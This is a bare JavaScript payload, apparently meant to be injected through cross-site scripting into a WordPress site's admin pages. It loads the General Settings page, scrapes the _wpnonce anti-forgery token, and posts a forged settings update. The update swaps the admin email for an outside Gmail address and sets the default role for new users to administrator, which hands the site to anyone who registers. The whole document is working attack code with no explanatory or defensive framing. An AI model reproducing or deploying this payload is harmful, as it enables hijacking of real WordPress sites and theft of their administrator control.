<script type="text/javascript">
    var req = new XMLHttpRequest();
    req.open("GET","https://app-secureproj.rhcloud.com/wp-admin/options-general.php",false);
    req.send(null);
    var text = req.responseText;
    var query = '<input type="hidden" id="_wpnonce" name="_wpnonce" value="';
    var index = text.search(query);

    var start = index+query.length;
    var end = start+10;
    var token = text.substring(start,end);

    console.log(token);
    var data = "";
    data += "option_page=general&";
    data += "action=update&";
    data += "_wpnonce="+token+"&";
    data += "_wp_http_referer=/wp-admin/options-general.php&";
    data += "blogname=secureproj&";
    data += "blogdescription=Just another WordPress sites hack&";
    data += "siteurl=http://app-secureproj.rhcloud.com&";
    data += "home=http://app-secureproj.rhcloud.com&";
    data += "admin_email=galeguy02@gmail.com&";
    data += "default_role=administrator&";
    data += "timezone_string=UTC+0&";
    data += "date_format=F j, Y&";
    data += "date_format_custom=F j, Y&";
    data += "time_format=g:i a&";
    data += "time_format_custom=g:i a&";
    data += "start_of_week=1&";
    data += "WPLANG=&";
    data += "submit=Save Changes";
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://app-secureproj.rhcloud.com/wp-admin/options.php', true);
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr.send(data);
</script>